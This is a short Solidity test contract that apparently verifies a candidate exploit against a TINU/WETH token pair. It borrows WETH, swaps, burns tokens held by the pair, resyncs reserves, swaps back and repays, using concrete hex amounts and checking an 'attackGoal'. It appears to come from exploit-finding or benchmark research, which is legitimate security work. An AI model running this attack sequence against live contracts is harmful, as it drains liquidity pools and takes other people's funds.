// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./TINU.t.sol";

contract TINUVerify is TINUTest {
    function test_verify_cand002_0() public {
        uint256 amt0 = 0x21b400238000000000000;
        uint256 amt1 = 0x1ffffc000000000000000;
        uint256 amt2 = 0xd7977db2865afe68d;
        uint256 amt3 = 0x600000000030000;
        uint256 amt4 = 0x21b4003227aa67b2d0001;
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        sync_pair();
        swap_pair_tinu_weth(amt3);
        payback_weth(amt4);
        require(attackGoal(), "Attack failed!");
    }
}
